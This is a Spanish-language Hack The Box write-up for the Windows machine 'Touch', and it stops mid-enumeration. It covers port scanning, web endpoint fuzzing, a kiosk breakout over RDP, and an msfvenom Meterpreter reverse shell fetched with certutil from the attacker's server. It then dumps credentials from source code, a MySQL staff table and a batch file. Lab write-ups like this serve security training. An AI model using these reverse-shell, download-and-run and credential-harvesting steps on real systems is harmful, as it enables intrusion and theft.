---
# Touch WriteUp - Hack The Box
**Date**: `2026-10-08`
**Level**: `Easy`
**OS**: `Windows`
**IP**: `10.129.127.154`
**Tags**: `samba`, `metasploit`
---

## Executive Summary
Touch es una máquina Windows fácil.

---

## Reconocimiento

### Ping 
Lo primero que haremos es saber si tenemos conexión con la máquina victima y saber a qué sistema operativo nos enfrentamos.
```bash 
ping -c 1 10.129.127.154
```
El cual nos devuelve lo siguiente:
```bash
PING 10.129.127.154 (10.129.127.154) 56(84) bytes of data.
64 bytes from 10.129.127.154: icmp_seq=1 ttl=127 time=109 ms

--- 10.129.127.154 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.582/108.582/108.582/0.000 ms
```
Como lo devuelve el comando anterior, tenemos conexión y estamos contra una máquina con sistema operativo `Windows`, ya sabemos que es porque el **TTL** nos dice hacía que nos enfrentamos, no siempre es lo mismo, pero cuando es cercano a **64** sabemos que es una máquina `Linux`, en caso contrario si se acerca a **128** es una máquina `Windows`.

### Nmap
Ahora vamos a mirar que puertos tiene esta máquina abiertos, para ello usamos el siguiente comando **Nmap** en el cuál le vamos a indicar los siguientes parámetros:
- `-p-`: Indica que queremos escanear los 65535 puertos de la máquina victima.
- `--open`: Indicamos que solo queremos que nos devuelva que puertos están abiertos.
- `-sS`: Indicamos que queremos un escaneo del tipo TCP SYN con el fin de ser rápidos y que nos dé bastante información de ser posible.
- `--min-rate 5000`: Indicamos que debe enviar 5000 paquetes con cada escaneo.
- `-vvv`: Indicamos que debe de tener verbose, el cuál sirve para agilizar el proceso, en este caso usamos triple verbose para ser muy rápidos.
_ `-n`: Indicamos que no queremos que nos aplique resolución DNS.
- `-Pn`: Indicamos que no debe hacer descubrimiento de host, osea que asuma que el host ya está activo y que lo escanee directamente.
- `10.129.127.154`: Pasamos la IP de la máquina victima.
- `-oG`: Indicamos que queremos un archivo del tipo Grepable, para que podamos usar herramientas en el como: `grep`, `awk` y demás con el fin de procesarlo fácilmente.
- `allPorts`: Indicamos el nombre con el que queremos que se guarde la sálida de **Nmap**.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.127.154 -oG allPorts
```
Esto nos devuelve:
```javascript
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2026-10-08 11:23 -05
Initiating SYN Stealth Scan at 11:23
Scanning 10.129.127.154 [65535 ports]
Discovered open port 135/tcp on 10.129.127.154
Discovered open port 3389/tcp on 10.129.127.154
Discovered open port 5985/tcp on 10.129.127.154
Discovered open port 8443/tcp on 10.129.127.154
Completed SYN Stealth Scan at 11:24, 26.36s elapsed (65535 total ports)
Nmap scan report for 10.129.127.154
Host is up, received user-set (0.10s latency).
Scanned at 2026-10-08 11:23:37 -05 for 26s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       REASON
135/tcp  open  msrpc         syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
5985/tcp open  wsman         syn-ack ttl 127
8443/tcp open  https-alt     syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 21 (924B)
```
De aquí podemos obtener varios puertos importantes que nos pueden servir para identificar los servicios que están corriendo en la máquina víctima:

- `135`: Este puerto corresponde a **MSRPC (Microsoft Remote Procedure Call)**. Es utilizado por `Windows` para permitir la comunicación entre diferentes procesos y servicios, incluso de forma remota. Es un puerto común en máquinas `Windows` y puede ayudarnos a obtener información sobre los servicios que están disponibles en el sistema.
- `3389`: Este puerto corresponde a **RDP (Remote Desktop Protocol)**, el protocolo utilizado por `Windows` para permitir conexiones de escritorio remoto. Si conseguimos unas credenciales válidas, este puerto podría permitirnos conectarnos gráficamente a la máquina víctima mediante un cliente RDP.
- `5985`: Este puerto corresponde a **WinRM (Windows Remote Management)** y utiliza normalmente **HTTP** para la comunicación. Es especialmente interesante en máquinas `Windows` porque, si conseguimos unas credenciales válidas y el servicio está correctamente configurado, podemos utilizarlo para obtener una sesión remota mediante herramientas como evil-winrm.
- `8443`: Nmap lo identifica como **HTTPS-alt**, es decir, una alternativa al puerto estándar `443` para servicios que utilizan **HTTPS**. Este puerto suele utilizarse para aplicaciones web, paneles administrativos o diferentes servicios web que necesitan comunicación cifrada. Por ello, sería interesante acceder a `https://10.129.127.154:8443` para comprobar qué servicio se encuentra funcionando allí.

Por lo tanto, los puertos que más nos interesan inicialmente son el `5985` y el `8443`. El `5985` podría permitirnos obtener acceso remoto mediante **WinRM** si conseguimos credenciales válidas, mientras que el `8443` podría contener una aplicación web que nos proporcione información o algún punto de entrada a la máquina.

Ahora usando otra vez **Nmap**, vamos a mirar que contiene esos puertos a parte del servicio que corren.
Lo hacemos con los siguientes parámetros:
- `-p135,3389,5985,8443`: Aca indicamos que puertos queremos escanear, ya no son todos.
- `-sCV`: En este hacemos una abreviación de `-sC` con el cuál indicamos que usaremos los `scripts predeterminados` de **Nmap** y el `-sV` indicandole que queremos saber las versiones de los servicios que corren en los puertos elegidos. 
- `10.129.127.154`: Pasamos la IP de la máquina victima.
- `-oN`: Le indicamos el tipo de archivo, el cual lo queremos del tipo **Nmap**, osea del tipo normal.
- `targeted`: Es el nombre del archivo donde queremos que se guarde la salida.
```bash
sudo nmap -p22,80 -sCV 10.129.127.154 -oN targeted
```
Esto nos devuelve:
```javascript
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Nexion DeviceHub - Login
|_Requested resource was /login
|_http-cors: GET POST PUT OPTIONS
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Podemos obtener información más específica de cada servicio:

- `135`: Encontramos **Microsoft Windows RPC**, utilizado por `Windows` para la comunicación entre procesos y servicios. Por el momento no parece ser nuestro principal punto de entrada, pero puede ser útil durante una enumeración más profunda de la máquina.
- `3389`: Tenemos **Microsoft Terminal Services**, que corresponde a **RDP (Remote Desktop Protocol)**. Este servicio permite realizar conexiones de escritorio remoto a la máquina `Windows`. Para utilizarlo normalmente necesitaremos unas credenciales válidas.
- `5985`: Encontramos **Microsoft HTTPAPI 2.0**, que corresponde al servicio utilizado por **WinRM (Windows Remote Management)** mediante **HTTP**. Este puerto resulta bastante interesante porque, si obtenemos unas credenciales válidas y el usuario tiene permisos para utilizar **WinRM**, podríamos conseguir una consola remota en la máquina.
- `8443`: Este es el puerto que resulta más interesante por ahora. **Nmap** identifica un servicio web llamado Nexion DeviceHub, concretamente una página de inicio de sesión:
    http-title: Nexion DeviceHub - Login
    Requested resource was /login

Esto nos indica que existe una aplicación web funcionando en 8443 y que dispone de un sistema de autenticación.

Además, **Nmap** nos muestra que el servidor permite diferentes métodos **HTTP**:
    GET POST PUT OPTIONS

El método **OPTIONS** puede utilizarse para consultar qué métodos **HTTP** están disponibles en un recurso, mientras que **GET** y **POST** son utilizados habitualmente para obtener y enviar información respectivamente.

Por lo tanto, nuestro siguiente objetivo debería ser enumerar la aplicación web que se encuentra en el puerto `8443`, ya que podría existir alguna vulnerabilidad o información que nos permita obtener credenciales para posteriormente acceder mediante **WinRM** o **RDP**.

### Web
Ahora vamos a ver la página en si en el navegador:
![Descubrimiento web](/images/machines/touch/img-01.png)

El panel corresponde a un dispositivo **DeviceHub DH-100 — Gate B7** y presenta diferentes opciones para autenticarse:

- **Device password**: permite iniciar sesión utilizando una contraseña asociada al dispositivo.
- **Scan Staff Badge**: permite acceder mediante una credencial de empleado.
- **Forgot your password?**: opción para recuperar la contraseña.

Esto nos confirma que el puerto `8443` está ejecutando una aplicación web y que puede ser un posible punto de entrada a la máquina.

Por ahora no tenemos credenciales, por lo que antes de intentar realizar ataques de fuerza bruta, es conveniente **enumerar la aplicación** y buscar funcionalidades, endpoints, archivos o información que puedan ayudarnos a descubrir cómo funciona el sistema de autenticación.

## Enumeration

### Curl
Vamos a usar **Curl** para descubrir cómo es el código de la página:
```bash
curl -k http://10.129.127.154:8443/login
```
Obtenemos esto: 
```javascript
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Nexion DeviceHub - Login</title><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/css/style.css">
<style>body{display:flex;align-items:center;justify-content:center;min-height:100vh}.login-box{width:380px;background:#161a23;border:1px solid #2a2e38;border-radius:12px;padding:40px}.login-logo{width:48px;height:48px;background:#2563eb;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:24px;color:#fff;margin:0 auto 20px}.login-title{text-align:center;font-size:18px;font-weight:700;color:#e0e0e0;margin-bottom:4px}.login-sub{text-align:center;font-size:12px;color:#666;margin-bottom:28px}.login-input{width:100%;padding:12px 14px;background:#0f1117;border:1px solid #2a2e38;border-radius:6px;color:#e0e0e0;font-size:14px;margin-bottom:16px}.login-input:focus{border-color:#2563eb;outline:none}.login-input::placeholder{color:#555}.login-btn{width:100%;padding:12px;background:#2563eb;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer}.login-btn:hover{background:#1d4ed8}.login-error{background:#3b1c1c;border:1px solid #7f1d1d;color:#f87171;padding:10px 14px;border-radius:6px;font-size:12px;margin-bottom:16px;text-align:center}.login-hint{text-align:center;font-size:11px;color:#444;margin-top:20px;cursor:help}</style>
</head><body><div class="login-box"><div class="login-logo"><svg viewBox="0 0 36 36" width="28" height="28" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="4" width="32" height="28" rx="3" stroke="#fff" stroke-width="2.5"/><path d="M8 14h20M8 20h20M8 26h12" stroke="#60a5fa" stroke-width="2" stroke-linecap="round"/><rect x="10" y="1" width="16" height="6" rx="2" fill="#2563eb" stroke="#fff" stroke-width="1.5"/><circle cx="18" cy="4" r="1.5" fill="#fff"/></svg></div><div class="login-title">Nexion DocReader</div><div class="login-sub">DeviceHub DH-100 — Gate B7</div><form method="POST" action="/login"><input type="password" name="password" class="login-input" placeholder="Device password" autofocus required><button type="submit" class="login-btn">Sign In</button></form><div style="margin-top:16px;padding-top:16px;border-top:1px solid #2a2e38;text-align:center"><div style="font-size:10px;color:#555;letter-spacing:1px;margin-bottom:10px">STAFF ACCESS</div><button onclick="scanBadge()" id="badgeBtn" style="width:100%;padding:10px;background:#1a1e28;color:#888;border:1px solid #2a2e38;border-radius:6px;font-size:12px;cursor:pointer;font-family:monospace">Scan Staff Badge</button><div id="badgeStatus" style="font-size:11px;color:#555;margin-top:8px"></div></div><div class="login-hint" title="The default password is the device serial number included in your DeviceHub packaging.">Forgot your password?</div></div><script>function scanBadge(){var btn=document.getElementById('badgeBtn');var st=document.getElementById('badgeStatus');btn.disabled=true;btn.textContent='Scanning...';st.textContent='Place badge on scanner...';st.style.color='#0ea5e9';fetch('/login/badge',{method:'POST'}).then(r=>r.json()).then(d=>{if(d.success){st.textContent='Badge verified: '+d.name;st.style.color='#4ade80';setTimeout(()=>window.location.href=d.redirect,1000)}else{st.textContent=d.error||'Badge scan failed';st.style.color='#f87171';btn.disabled=false;btn.textContent='Scan Staff Badge'}}).catch(()=>{st.textContent='Scanner unavailable';st.style.color='#f87171';btn.disabled=false;btn.textContent='Scan Staff Badge'})}</script></body></html>
```
Encontramos una linea importante:
```javascript
<div class="login-hint" title="The default password is the device serial number included in your DeviceHub packaging.">
    Forgot your password?
</div>
```
Además de encontrar este **End-Point** importante:
```javascript
fetch('/login/badge',{method:'POST'})
```

### ffuf
Para descubrir el serial vamos a usar **ffuf**:


Ejecutamos:

```bash
ffuf -u http://10.129.127.154:8443/FUZZ -w /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt -fs 0
```
El parámetro:

- `u`: Define la **URL** objetivo.
- `FUZZ`: Indica el lugar donde **ffuf** realizará las sustituciones.
- `w`: Especifica el diccionario que utilizaremos.
- `fs`: Sirve para filtrar las respuestas según su tamaño en bytes.

Después de ejecutar el escaneo obtenemos varios resultados:

```javascript
 
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.127.154:8443/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/api/api-endpoints.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

api/status              [Status: 200, Size: 114, Words: 3, Lines: 1, Duration: 105ms]
:: Progress: [295/295] :: Job [1/1] :: 385 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```
Entramos a `http://10.129.127.154:8443/api/status`y encontramos lo siguiente:
![Descubrimiento web](/images/machines/touch/img-01.png)
Obtenemos la información:
- `device`	"Nexion DeviceHub DH-100"
- `serial`	"NX-DH-2024-B7042"
- `firmware`	"1.4.2"
- `status`	"online"
- `uptime`	1056

Obtuvimos el **Serial**, usemos para intentar acceder:
![Descubrimiento web](/images/machines/touch/img-01.png)
Encontramos un **Dashboard**, en el cuál hay un **Scanner** y una **Impresora** en los cuales hay credenciales que nos pueden servir: 
| Username: KioskUser
| Password: K!0sk2026#

---

## Exploitation

### XFreeRPD
Después de conseguir las credenciales debemos intentar acceder con ellas usando **XFreeRPD**:
```bash
xfreerdp /v:10.129.127.154 /u:KioskUser /p:'K!0sk2026#' /cert:ignore
```
IMG04

IMG 05

IMG 06
La información que necesitamos está en HackTheBox:

Machine Information

In the Layover machine, you uncovered a name and a booking confirmation code. Maybe they'll come in handy here? Jenny Crawford / KS7X2M

IMG 07

IMG 08
Damos escanear y nos saldrá un error, ese error lo podemos omitir si desde el dashboard apagamos el Scanner.
IMG 09
Y lo intentamos otra vez
IMG 10
Damos click en el enlace que nos aparece y nos aparecerá el navegador Edge.
IMG 11
Tenemos que ejecutar el cmd, para ello abriremos un archivo con Ctrl + O.
Escribimos `C:\Windows\System32\cmd.exe` en el recuadro y damos enter.
IMG 12
Nos lo descargará
IMG 13
Le damos click y nos abrirá el cmd.

USER
IMG 14

AHora necesitamos trabajar en nuestro equipo que es más cómodo, para ello ejecutamos lo siguiente:
```bash
mkdir -p /tmp/share
cd /tmp/share
```
Posteriormente creamos un Payload con Msfvenom:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=4445 -f exe -o /tmp/share/shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 509 bytes
Final size of exe file: 7680 bytes
Saved as: /tmp/share/shell.exe
```

Y ahora creamos un servidor de python para acceder desde el Windows:
```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Y en otra terminal ponemos el exploit en escucha: 
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.17; set LPORT 4445; exploit"
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
LHOST => 10.10.14.17
LPORT => 4445
[*] Started reverse TCP handler on 10.10.14.17:4445 
```

Ahora desde la máquina Windows ejecutamos lo siguiente:
```bash
certutil -urlcache -split -f http://10.10.14.17:8000/shell.exe shell.exe
shell.exe
```
Como lo muestra la imagen:
IMG15

Y luego ejecutamos el shell.exe:
```powershell
shell.exe
```
Y en el meterpreter tenemos:
```bash
[*] Meterpreter session 1 opened (10.10.14.17:4445 -> 10.129.127.154:53018) at 2026-10-08 19:10:13 -0500

meterpreter > sysinfo
Computer        : KIOSK-042
OS              : Windows 11 24H2+ (10.0 Build 26100).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > 
```
Ya tenemos acceso, miramos nuevamente el USER:
```bash
meterpreter > cd Desktop
meterpreter > cat user.txt
22b8286833a364a2574fe37b02765c73
```

Ahora cambiemos a una shell:
```bash
meterpreter > shell
Process 7108 created.
Channel 2 created.
Microsoft Windows [Version 10.0.26100.9457]
(c) Microsoft Corporation. All rights reserved.

C:\Users\KioskUser\Desktop>
```

Veamos los permisos y cosas que podemos hacer:
```powershell
C:\Users\KioskUser\Desktop>dir /q C:\Users
dir /q C:\Users
 Volume in drive C has no label.
 Volume Serial Number is 9B34-EFD9

 Directory of C:\Users

04/04/2026  06:56 AM    <DIR>          NT AUTHORITY\SYSTEM    .
04/04/2026  11:15 PM    <DIR>          ...                    Administrator
09/10/2026  11:36 AM    <DIR>          NT AUTHORITY\SYSTEM    KioskUser
07/16/2025  11:32 PM    <DIR>          NT AUTHORITY\SYSTEM    Public
               0 File(s)              0 bytes
               4 Dir(s)   8,701,415,424 bytes free

C:\Users\KioskUser\Desktop>
```

Haciendo una enumeración:
```powershell
C:\>dir  	
dir
 Volume in drive C has no label.
 Volume Serial Number is 9B34-EFD9

 Directory of C:\

09/15/2026  03:27 PM    <DIR>          inetpub
04/04/2026  02:34 PM    <DIR>          MySQL
04/01/2024  12:26 AM    <DIR>          PerfLogs
09/30/2026  12:23 PM    <DIR>          Program Files
04/01/2024  01:31 AM    <DIR>          Program Files (x86)
09/17/2026  05:14 PM    <DIR>          Temp
04/04/2026  06:56 AM    <DIR>          Users
09/24/2026  11:18 AM    <DIR>          Windows
               0 File(s)              0 bytes
               8 Dir(s)   8,696,963,072 bytes free

C:\>cd Program Files
cd Program Files

C:\Program Files>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9B34-EFD9

 Directory of C:\Program Files

09/30/2026  12:23 PM    <DIR>          .
07/16/2025  11:40 PM    <DIR>          Common Files
04/04/2026  03:33 PM    <DIR>          dotnet
04/04/2026  06:53 AM    <DIR>          HTB Airways
09/15/2026  03:28 PM    <DIR>          Internet Explorer
04/01/2024  12:26 AM    <DIR>          ModifiableWindowsApps
04/04/2026  06:46 AM    <DIR>          Nexion Systems
04/04/2026  06:45 AM    <DIR>          nodejs
09/30/2026  12:23 PM    <DIR>          PackageManagement
07/16/2025  11:40 PM    <DIR>          VMware
09/15/2026  03:28 PM    <DIR>          Windows Defender
09/15/2026  03:28 PM    <DIR>          Windows Defender Advanced Threat Protection
09/15/2026  03:28 PM    <DIR>          Windows Mail
09/15/2026  03:28 PM    <DIR>          Windows Media Player
04/01/2024  01:00 AM    <DIR>          Windows NT
09/15/2026  03:28 PM    <DIR>          Windows Photo Viewer
09/30/2026  12:23 PM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              17 Dir(s)   8,696,963,072 bytes free
```
Encontramos 2 que destacan HTB Airways y Nexion Systems.
Además al ejecutar el siguiente comando:
```powershell
C:\>dir "C:\ProgramData\HTB Airways" /s /b
dir "C:\ProgramData\HTB Airways" /s /b
C:\ProgramData\HTB Airways\db-config.ini
C:\ProgramData\HTB Airways\db-sync-replica.ps1
C:\ProgramData\HTB Airways\refresh-dates.bat
C:\ProgramData\HTB Airways\refresh-dates.sql
```
Encontramos varios archivos:
```powershell
type "C:\ProgramData\HTB Airways\db-sync-replica.ps1"
```
Pero no podemos verlo, haciendo más enumeración encontramos lo siguiente:
```powershell
C:\MySQL\bin>type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
import mysql from "mysql2/promise";
import fs from "fs";
import path from "path";

const DB_CONFIG_PATH = process.env.DB_CONFIG_PATH || "C:\\ProgramData\\HTB Airways\\db-config.ini";

function loadConfig(): { host: string; port: number; user: string; password: string; database: string } {
  const defaults = { host: "127.0.0.1", port: 3306, user: "kiosk_app", password: "K!0sk_R3pl1ca#DB", database: "htb_airways" };
  try {
    const ini = fs.readFileSync(DB_CONFIG_PATH, "utf8");
    const get = (key: string) => {
      const m = ini.match(new RegExp(`^${key}\\s*=\\s*(.+)$`, "m"));
      return m ? m[1].trim() : undefined;
    };
    return {
      host: get("host") || defaults.host,
      port: parseInt(get("port") || String(defaults.port), 10),
      user: get("user") || defaults.user,
      password: get("password") || defaults.password,
      database: get("database") || defaults.database,
    };
  } catch {
    return defaults;
  }
}

let pool: mysql.Pool;

export function getDb(): mysql.Pool {
  if (!pool) {
    const cfg = loadConfig();
    pool = mysql.createPool({
      host: cfg.host,
      port: cfg.port,
      user: cfg.user,
      password: cfg.password,
      database: cfg.database,
      waitForConnections: true,
      connectionLimit: 10,
      queueLimit: 0,
    });
    console.log(`MySQL pool created: ${cfg.user}@${cfg.host}:${cfg.port}/${cfg.database}`);
  }
  return pool;
}

export async function checkConnection(): Promise<boolean> {
  try {
    const conn = await getDb().getConnection();
    await conn.ping();
    conn.release();
    return true;
  } catch {
    return false;
  }
}

export function logCheckinAction(pnr: string, passengerId: string, action: string, details?: string) {
  getDb().execute(
    "INSERT INTO checkin_log (pnr, passenger_id, action, details) VALUES (?, ?, ?, ?)",
    [pnr, passengerId, action, details || null]
  ).catch(() => {});
}

export function saveSeatAssignment(passengerId: string, segmentId: string, seat: string, seatClass: string) {
  getDb().execute(
    "INSERT INTO seat_assignments (passenger_id, segment_id, seat_number, seat_class) VALUES (?, ?, ?, ?) ON DUPLICATE KEY UPDATE seat_number = VALUES(seat_number), seat_class = VALUES(seat_class)",
    [passengerId, segmentId, seat, seatClass]
  ).catch(() => {});
}

export function saveBoardingPass(passengerId: string, segmentId: string, pnr: string, seat: string, gate: string, boardingTime: string, barcodeData: string) {
  getDb().execute(
    "INSERT INTO boarding_passes (passenger_id, segment_id, pnr, seat_number, gate, boarding_time, barcode_data) VALUES (?, ?, ?, ?, ?, ?, ?)",
    [passengerId, segmentId, pnr, seat, gate, boardingTime, barcodeData]
  ).catch(() => {});
}
```
Aquí están:
host:     127.0.0.1
port:     3306
user:     kiosk_app
password: K!0sk_R3pl1ca#DB
database: htb_airways

Para no acceder, usemos desde afuera todo:
```powershell
C:\MySQL\bin>mysql -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"
mysql -u kiosk_app -pK!0sk_R3pl1ca#DB -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"
mysql: [Warning] Using a password on the command line interface can be insecure.
employee_id	email	auth_code	role	active
HTB-97248	mmitchell@htbairways.htb	4601947A40E4BDCE	Cargo Supervisor	1
HTB-80469	ekovacs@htbairways.htb	D4E96DB85AECAFC4	First Officer	1
HTB-98398	dandersen@htbairways.htb	255160EA80AF52CC	Senior Check-in Agent	1
HTB-25469	snakamura@htbairways.htb	65BBA59D1B5145E7	First Officer	1
HTB-76155	jokonkwo@htbairways.htb	EA42FAB8CAE50D63	Maintenance Technician	1
HTB-38997	pbergstrm@htbairways.htb	D531E04C42758846	Check-in Agent	1
HTB-66373	tsantos@htbairways.htb	DBEA8BF35F3B93A3	Aviation Security Lead	1
HTB-58295	mpatel@htbairways.htb	E624511D7FD0A720	Customer Service Agent	1
HTB-98600	cdubois@htbairways.htb	88123126BC55AC23	Duty Manager	1
HTB-34325	fkim@htbairways.htb	60F90262004EF01F	Gate Agent	1
HTB-43955	rhoffmann@htbairways.htb	AD59D674FEE120D4	Revenue Management Analyst	1
HTB-45332	atorres@htbairways.htb	5E029161F6ECE1A9	Quality Assurance Inspector	1
HTB-15827	wivanova@htbairways.htb	43F718B0397FFDF5	Operations Manager	1
HTB-54598	yyamamoto@htbairways.htb	BFDD344882B28674	Operations Manager	1
HTB-75142	aalrashid@htbairways.htb	B0E5D6C0675DC6DC	Security Screening Officer	1
HTB-24441	olindberg@htbairways.htb	1871D8DE90E9135B	Check-in Supervisor	1
HTB-89426	smller@htbairways.htb	DFD0F7A09BFC9351	Baggage Handler	1
HTB-73230	nfernandez@htbairways.htb	48E3CA097528E009	Ticketing Agent	1
HTB-12142	pjohansson@htbairways.htb	CC1C6384C79F8486	Safety Officer	1
HTB-11937	zchen@htbairways.htb	7BF959E12104A59B	Flight Engineer	1
HTB-58317	mmcallister@htbairways.htb	A653E3DEECCBDBCE	Customer Service Agent	1
HTB-34190	cpetrov@htbairways.htb	9C70CBAA6540797E	Terminal Coordinator	1
HTB-21796	bgonzalez@htbairways.htb	65D6F6CED43D3C2E	Line Maintenance Supervisor	1
HTB-97223	ltanaka@htbairways.htb	6348DC443E0883A9	Line Maintenance Supervisor	1
HTB-31181	aibrahim@htbairways.htb	B678BB6055ACE81F	Station Manager	1
HTB-18972	snielsen@htbairways.htb	A172D8EA101681AE	Check-in Supervisor	1
HTB-15335	kweber@htbairways.htb	E5AEFED3F2EEA35F	First Officer	1
HTB-23411	amartinez@htbairways.htb	B53951FF8C7B63CE	Lounge Manager	1
HTB-35391	lsuzuki@htbairways.htb	7DD9286F5DC8B104	Ticketing Agent	1
HTB-98705	ehassan@htbairways.htb	F83329B17B0C0E83	Customer Service Agent	1
HTB-37522	deriksson@htbairways.htb	644D5E009C35E316	Safety Officer	1
HTB-58288	isilva@htbairways.htb	B95FB54E61B9B4AC	Station Manager	1
```

Dado que nos dá acceso, puede haber una contraseña para el usuario root en esta misma base de datos:
```powershell
C:\> dir "C:\ProgramData\HTB Airways" /s /b
dir "C:\ProgramData\HTB Airways" /s /b
C:\ProgramData\HTB Airways\db-config.ini
C:\ProgramData\HTB Airways\db-sync-replica.ps1
C:\ProgramData\HTB Airways\refresh-dates.bat
C:\ProgramData\HTB Airways\refresh-dates.sql
```
Ahora abramos cada uno de ellos:
```powershell
C:\>type "C:\ProgramData\HTB Airways\db-config.ini"
type "C:\ProgramData\HTB Airways\db-config.ini"
Access is denied.

C:\>type "C:\ProgramData\HTB Airways\db-sync-replica.ps1"
type "C:\ProgramData\HTB Airways\db-sync-replica.ps1"
Access is denied.

C:\>type "C:\ProgramData\HTB Airways\refresh-dates.bat"
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul

C:\>type "C:\ProgramData\HTB Airways\refresh-dates.sql"
type "C:\ProgramData\HTB Airways\refresh-dates.sql"
USE htb_airways;

UPDATE flights SET
  dep_time = DATE_FORMAT(
    DATE_ADD(NOW(), INTERVAL (CONV(SUBSTRING(MD5(segment_id),1,4),16,10) % 72) HOUR),
    '%Y-%m-%dT%H:%i:00Z'
  ),
  arr_time = DATE_FORMAT(
    DATE_ADD(NOW(), INTERVAL (CONV(SUBSTRING(MD5(segment_id),1,4),16,10) % 72 + 4 + CONV(SUBSTRING(MD5(segment_id),5,2),16,10) % 16) HOUR),
    '%Y-%m-%dT%H:%i:00Z'
  );

UPDATE bookings SET
  created_at = DATE_SUB(NOW(), INTERVAL (1 + CONV(SUBSTRING(MD5(pnr),1,4),16,10) % 90) DAY)
WHERE created_at < DATE_SUB(NOW(), INTERVAL 100 DAY);

UPDATE boarding_passes bp
JOIN flights f ON f.segment_id = bp.segment_id
SET bp.boarding_time = DATE_FORMAT(DATE_SUB(f.dep_time, INTERVAL 45 MINUTE), '%H:%i');

UPDATE htb_airways._sync_metadata SET
  started_at = DATE_SUB(NOW(), INTERVAL (CONV(SUBSTRING(MD5(id),1,4),16,10) % 720) MINUTE),
  completed_at = DATE_SUB(NOW(), INTERVAL (CONV(SUBSTRING(MD5(id),1,4),16,10) % 720 - 1) MINUTE)
WHERE started_at < DATE_SUB(NOW(), INTERVAL 7 DAY);

USE nexion_devices;

UPDATE devices SET
  last_used = DATE_SUB(NOW(), INTERVAL (CONV(SUBSTRING(MD5(device_id),1,2),16,10) % 6) HOUR),
  last_maintenance = DATE_SUB(NOW(), INTERVAL (7 + CONV(SUBSTRING(MD5(device_id),3,2),16,10) % 30) DAY),
  installed_at = DATE_SUB(NOW(), INTERVAL (180 + CONV(SUBSTRING(MD5(device_id),5,2),16,10) % 200) DAY)
WHERE device_type = 'scanner';

UPDATE devices SET
  last_used = DATE_SUB(NOW(), INTERVAL (CONV(SUBSTRING(MD5(device_id),1,2),16,10) % 4) HOUR),
  last_maintenance = DATE_SUB(NOW(), INTERVAL (7 + CONV(SUBSTRING(MD5(device_id),3,2),16,10) % 30) DAY),
  installed_at = DATE_SUB(NOW(), INTERVAL (180 + CONV(SUBSTRING(MD5(device_id),5,2),16,10) % 200) DAY)
WHERE device_type = 'printer';

UPDATE devices SET last_calibration = DATE_SUB(NOW(), INTERVAL (1 + CONV(SUBSTRING(MD5(device_id),7,2),16,10) % 14) DAY)
WHERE device_type = 'scanner';

UPDATE devices SET usage_count = 24000 + (CONV(SUBSTRING(MD5(device_id),1,4),16,10) % 8000)
WHERE device_type = 'scanner';

UPDATE devices SET usage_count = 18000 + (CONV(SUBSTRING(MD5(device_id),1,4),16,10) % 6000)
WHERE device_type = 'printer';

